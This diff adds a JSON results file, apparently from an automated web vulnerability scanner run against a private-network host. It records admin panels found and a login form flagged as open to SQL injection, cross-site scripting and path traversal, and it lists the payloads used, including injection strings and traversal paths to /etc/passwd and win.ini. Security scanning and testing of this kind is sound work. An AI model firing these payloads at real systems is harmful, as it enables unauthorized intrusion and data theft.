@@ -1,0 +1,101 @@
+{
+    "results": [
+        {
+            "target": "http://192.168.1.100:80",
+            "admin_panels": [
+                "http://192.168.1.100:80/admin",
+                "http://192.168.1.100:80/login",
+                "http://192.168.1.100:80/dashboard"
+            ],
+            "sqli": [
+                "http://192.168.1.100:80/login_check/index.php [form POST]"
+            ],
+            "xss": [
+                "http://192.168.1.100:80/login_check/index.php [form POST]"
+            ],
+            "lfi": [
+                "http://192.168.1.100:80/login_check/index.php [form POST]"
+            ],
+            "form_metadata": [
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "' OR 1=1--",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "' OR 'a'='a",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "' UNION SELECT NULL--",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "' OR sleep(5)--",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "<img src=x onerror=alert('xss')>",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "'><svg onload=alert(1)>",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "<body onload=alert('XSS')>",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "../../../../etc/passwd",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "../boot.ini",
+                    "result": "vulnerable"
+                },
+                {
+                    "form_url": "http://192.168.1.100:80/login_check/index.php",
+                    "method": "post",
+                    "input_count": 3,
+                    "payload": "../../../../windows/win.ini",
+                    "result": "vulnerable"
+                }
+            ]
+        },
+        {
+            "target": "https://192.168.1.100:443",
+            "admin_panels": [],
+            "sqli": [],
+            "xss": [],
+            "lfi": [],
+            "form_metadata": []
+        }
+    ]
+}
